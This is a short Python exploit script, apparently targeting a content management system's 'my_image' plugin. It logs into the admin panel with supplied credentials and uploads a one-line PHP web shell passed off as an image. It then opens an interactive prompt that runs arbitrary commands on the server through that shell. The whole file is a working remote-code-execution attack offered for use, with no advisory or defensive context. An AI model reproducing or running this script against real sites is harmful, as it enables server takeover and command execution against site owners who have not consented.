#!/bin/python

import requests,sys

fileName = "sh.php"
body="<?php system($_GET['cmd']);"

def usage():
	print("[+] {0} [target url] [username] [password]".format(sys.argv[0]))
	exit()

try:
	target = sys.argv[1]
	uploadUrl = target + "admin.php?controller=plugins&action=config&plugin=my_image"
	targetLogin = target+"admin.php"
	username = sys.argv[2]
	password = sys.argv[3]
	shellPath = target+"content/private/plugins/my_image/image.php"

except IndexError:
	usage()

data = {
	"username":username,
	"password":password
}
try:

	req = requests.post(targetLogin, data=data,allow_redirects=False)
	
	# Uploading Shell Code
	cookie = {
		req.headers['Set-Cookie'].split('=')[0]:req.headers['Set-Cookie'].split('=')[1]
	}
	file={
	'image': (fileName, body, 'application/x-php')
	}

	da = {
	'plugin':'my_image',
	'title':'My image',
	'position':'4',
	'caption':'',
	'image_resize':'1',
	'image_width':'230',
	'image_height':'200',
	'image_option':'auto'
	}
	uploadFileReq = requests.post(uploadUrl,cookies=cookie, data=da, files=file, timeout=30)

	while True:
		inp = input("shell-$ ")
		if inp == "exit":
			exit()
		shell = requests.get(shellPath,params={"cmd":inp})
		print(shell.text)

except requests.exceptions.MissingSchema:
	print("[-] issue with target: {0}".format(targetLogin))
	pass

except requests.exceptions.SSLError as err:
	print("[-] issue with SSL: "+str(err))
	pass

except requests.exceptions.ConnectionError as err:
	print("[-] Error: "+str(err))
	pass